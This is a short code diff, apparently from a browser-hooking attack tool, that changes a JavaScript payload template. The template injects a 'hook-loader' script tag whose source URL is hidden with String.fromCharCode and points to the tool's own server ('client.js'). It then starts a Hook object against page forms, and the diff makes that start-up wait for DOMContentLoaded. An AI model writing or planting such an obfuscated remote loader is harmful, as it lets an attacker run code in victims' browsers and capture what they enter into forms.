@@ -22,12 +22,16 @@ xb.src = String.fromCharCode({server});
 xb.id = 'hook-loader';
 if(!document.querySelector('script[id="hook-loader"]'))
 xh.appendChild(xb);
-try {
+window.addEventListener("DOMContentLoaded", (event) => {
+  console.log("DOM fully loaded and parsed");
+  try {
     window._LOL = window._LOL ?? new Hook();
     window._LOL.init('form');
         } catch (e) {
             console.error(e);
         }
+});
+
 `.replace(
             '{server}',
             '{0}/client.js?cache=ignore'.format(request.web_url.replace('/install', '')).getCharCodeAt(),
